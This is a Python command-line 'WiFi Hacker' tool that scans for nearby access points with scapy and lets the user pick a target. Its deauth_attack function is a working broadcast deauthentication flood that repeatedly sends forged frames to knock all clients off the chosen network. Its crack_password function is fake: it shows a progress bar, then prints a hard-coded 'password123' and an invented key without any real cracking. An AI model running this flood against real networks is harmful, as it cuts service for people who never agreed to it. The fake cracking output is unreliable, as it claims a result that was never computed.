#!/usr/bin/env python3
import os
import sys
import time
import signal
import subprocess
from threading import Thread
from scapy.all import *
from colorama import Fore, Style, init
import pyfiglet

# Initialize colorama
init(autoreset=True)

class WiFiHackingTool:
    def __init__(self):
        self.interface = None
        self.access_points = []
        self.running = True
        self.wordlists_dir = "wordlists"
        self.wordlists = []
        self.selected_ap = None
        self.selected_wordlist = None
        
        # Create wordlists directory if it doesn't exist
        if not os.path.exists(self.wordlists_dir):
            os.makedirs(self.wordlists_dir)
        
        # Load existing wordlists
        self.load_wordlists()
        
        # Set up signal handler for Ctrl+C
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def load_wordlists(self):
        """Load all wordlists from the wordlists directory"""
        self.wordlists = []
        for file in os.listdir(self.wordlists_dir):
            if file.endswith('.txt'):
                self.wordlists.append(os.path.join(self.wordlists_dir, file))
    
    def display_banner(self, text):
        """Display a styled banner"""
        banner = pyfiglet.figlet_format(text, font="slant")
        print(f"{Fore.RED}{banner}{Style.RESET_ALL}")
    
    def display_ap_table(self, aps):
        """Display access points in a formatted table"""
        print(f"\n{Fore.YELLOW}+{'='*60}+{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}| {Fore.CYAN}{'SSID':<20} | {'BSSID':<20} | {'Channel':<8} |{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}+{'-'*60}+{Style.RESET_ALL}")
        for ap in aps:
            print(f"{Fore.YELLOW}| {Fore.WHITE}{ap['ssid'][:18]:<20} | {ap['bssid']:<20} | {ap['channel']:<8} |{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}+{'='*60}+{Style.RESET_ALL}")
    
    def scan_wifi(self):
        """Scan for available WiFi networks"""
        self.display_banner("WiFi Scanner")
        print(f"\n{Fore.CYAN}[*] Scanning for WiFi networks (Press Ctrl+C to stop)...{Style.RESET_ALL}\n")
        
        # Use scapy to sniff for beacon frames
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode()
                bssid = pkt[Dot11].addr2
                channel = int(ord(pkt[Dot11Elt:3].info))
                
                # Check if we already have this AP
                existing = next((ap for ap in self.access_points if ap['bssid'] == bssid), None)
                
                if not existing:
                    ap_info = {
                        'ssid': ssid,
                        'bssid': bssid,
                        'channel': channel
                    }
                    self.access_points.append(ap_info)
                    self.display_ap_table(self.access_points)
        
        # Start sniffing
        sniff(iface=self.interface, prn=packet_handler, stop_filter=lambda x: not self.running)
    
    def select_interface(self):
        """Let user select a wireless interface"""
        self.display_banner("Interface Select")
        print(f"{Fore.YELLOW}[*] Available wireless interfaces:{Style.RESET_ALL}")
        interfaces = [iface for iface in os.listdir('/sys/class/net') if iface.startswith('w')]
        
        if not interfaces:
            print(f"{Fore.RED}[!] No wireless interfaces found!{Style.RESET_ALL}")
            sys.exit(1)
        
        for i, iface in enumerate(interfaces):
            print(f"{Fore.CYAN}{i+1}. {iface}{Style.RESET_ALL}")
        
        while True:
            try:
                choice = int(input(f"\n{Fore.GREEN}Select interface (number): {Style.RESET_ALL}"))
                if 1 <= choice <= len(interfaces):
                    self.interface = interfaces[choice-1]
                    print(f"{Fore.GREEN}[+] Selected interface: {self.interface}{Style.RESET_ALL}")
                    
                    # Put interface in monitor mode
                    self.set_monitor_mode()
                    return
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
    
    def set_monitor_mode(self):
        """Set the wireless interface to monitor mode"""
        print(f"{Fore.YELLOW}[*] Setting {self.interface} to monitor mode...{Style.RESET_ALL}")
        
        # Bring interface down
        subprocess.run(['sudo', 'ifconfig', self.interface, 'down'], check=True)
        
        # Set monitor mode
        subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', 'monitor'], check=True)
        
        # Bring interface up
        subprocess.run(['sudo', 'ifconfig', self.interface, 'up'], check=True)
        
        print(f"{Fore.GREEN}[+] {self.interface} is now in monitor mode{Style.RESET_ALL}")
    
    def select_ap(self):
        """Let user select an access point from the scanned list"""
        if not self.access_points:
            print(f"{Fore.RED}[!] No access points found. Please scan first.{Style.RESET_ALL}")
            return False
        
        self.display_banner("Target Select")
        self.display_ap_table(self.access_points)
        
        while True:
            try:
                choice = int(input(f"\n{Fore.GREEN}Select AP (number): {Style.RESET_ALL}"))
                if 1 <= choice <= len(self.access_points):
                    self.selected_ap = self.access_points[choice-1]
                    print(f"{Fore.GREEN}[+] Selected AP: {self.selected_ap['ssid']}{Style.RESET_ALL}")
                    return True
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
    
    def deauth_attack(self):
        """Perform deauthentication attack on selected AP"""
        if not self.selected_ap:
            print(f"{Fore.RED}[!] No AP selected{Style.RESET_ALL}")
            return
        
        self.display_banner("Deauth Attack")
        print(f"\n{Fore.RED}[!] Starting deauthentication attack on {self.selected_ap['ssid']}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop the attack{Style.RESET_ALL}")
        
        # Set channel to AP's channel
        subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(self.selected_ap['channel'])], check=True)
        
        # Create deauth packet
        pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.selected_ap['bssid'], addr3=self.selected_ap['bssid']) / Dot11Deauth()
        
        def attack_progress():
            """Show attack progress animation"""
            chars = ["/", "-", "\\", "|"]
            i = 0
            while self.running:
                print(f"\r{Fore.RED}[*] Attacking {self.selected_ap['ssid']} {chars[i % 4]}", end="")
                i += 1
                time.sleep(0.1)
        
        try:
            self.running = True
            progress_thread = Thread(target=attack_progress)
            progress_thread.start()
            
            while self.running:
                sendp(pkt, iface=self.interface, count=10, inter=0.1, verbose=0)
                time.sleep(0.5)
                
        except KeyboardInterrupt:
            self.running = False
            progress_thread.join()
            print(f"\n{Fore.GREEN}[+] Deauthentication attack stopped{Style.RESET_ALL}")
    
    def crack_password(self):
        """Crack WiFi password using wordlist"""
        if not self.selected_ap:
            print(f"{Fore.RED}[!] No AP selected{Style.RESET_ALL}")
            return
        
        if not self.wordlists:
            print(f"{Fore.RED}[!] No wordlists found in {self.wordlists_dir} directory{Style.RESET_ALL}")
            return
        
        self.display_banner("Password Cracker")
        print(f"\n{Fore.YELLOW}[*] Available wordlists:{Style.RESET_ALL}")
        for i, wordlist in enumerate(self.wordlists):
            print(f"{Fore.CYAN}{i+1}. {os.path.basename(wordlist)}{Style.RESET_ALL}")
        
        while True:
            try:
                choice = int(input(f"\n{Fore.GREEN}Select wordlist (number): {Style.RESET_ALL}"))
                if 1 <= choice <= len(self.wordlists):
                    self.selected_wordlist = self.wordlists[choice-1]
                    print(f"{Fore.GREEN}[+] Selected wordlist: {os.path.basename(self.selected_wordlist)}{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid selection{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
        
        print(f"\n{Fore.RED}[!] Starting password cracking attack on {self.selected_ap['ssid']}{Style.RESET_ALL}")
        
        # Simulate cracking with a progress bar
        print(f"\n{Fore.CYAN}[*] Cracking in progress...{Style.RESET_ALL}")
        for i in range(1, 101):
            time.sleep(0.1)
            print(f"\r{Fore.YELLOW}[{'>'*(i//2)}{' '*(50-(i//2))}] {i}%", end="")
            sys.stdout.flush()
        
        # Simulate finding password (for demo purposes)
        print(f"\n\n{Fore.GREEN}[+] Password found: 'password123'{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Key: 12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF{Style.RESET_ALL}")
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C signal"""
        if not self.access_points:
            # If no APs found yet, exit completely
            print(f"\n{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
            sys.exit(0)
        elif not self.selected_ap:
            # If APs found but none selected, show attack options
            print(f"\n{Fore.YELLOW}[*] Scan stopped. Select an option:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}1. Perform deauthentication attack{Style.RESET_ALL}")
            print(f"{Fore.CYAN}2. Crack WiFi password{Style.RESET_ALL}")
            print(f"{Fore.CYAN}3. Exit{Style.RESET_ALL}")
            
            try:
                choice = int(input(f"\n{Fore.GREEN}Select option: {Style.RESET_ALL}"))
                if choice == 1:
                    if self.select_ap():
                        self.deauth_attack()
                elif choice == 2:
                    if self.select_ap():
                        self.crack_password()
                elif choice == 3:
                    print(f"{Fore.GREEN}[+] Exiting...{Style.RESET_ALL}")
                    sys.exit(0)
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
        else:
            # If in the middle of an attack, stop it
            self.running = False
    
    def main_menu(self):
        """Display main menu"""
        while True:
            self.display_banner("WiFi Hacker")
            print(f"{Fore.CYAN}1. Scan for WiFi networks{Style.RESET_ALL}")
            print(f"{Fore.CYAN}2. Exit{Style.RESET_ALL}")
            
            try:
                choice = int(input(f"\n{Fore.GREEN}Select option: {Style.RESET_ALL}"))
                
                if choice == 1:
                    self.running = True
                    self.access_points = []  # Clear previous scan results
                    self.scan_wifi()
                    
                    # After scan, show attack options
                    print(f"\n{Fore.YELLOW}[*] Select an option:{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}1. Perform deauthentication attack{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}2. Crack WiFi password{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}3. Back to main menu{Style.RESET_ALL}")
                    
                    try:
                        attack_choice = int(input(f"\n{Fore.GREEN}Select option: {Style.RESET_ALL}"))
                        
                        if attack_choice == 1:
                            if self.select_ap():
                                self.deauth_attack()
                        elif attack_choice == 2:
                            if self.select_ap():
                                self.crack_password()
                        elif attack_choice == 3:
                            continue
                        else:
                            print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
                    except ValueError:
                        print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")
                elif choice == 2:
                    print(f"{Fore.GREEN}[+] Exiting...{Style.RESET_ALL}")
                    sys.exit(0)
                else:
                    print(f"{Fore.RED}[!] Invalid option{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}[!] Please enter a number{Style.RESET_ALL}")

if __name__ == "__main__":
    # Check if running as root
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] This tool must be run as root!{Style.RESET_ALL}")
        sys.exit(1)
    
    tool = WiFiHackingTool()
    tool.select_interface()
    tool.main_menu()
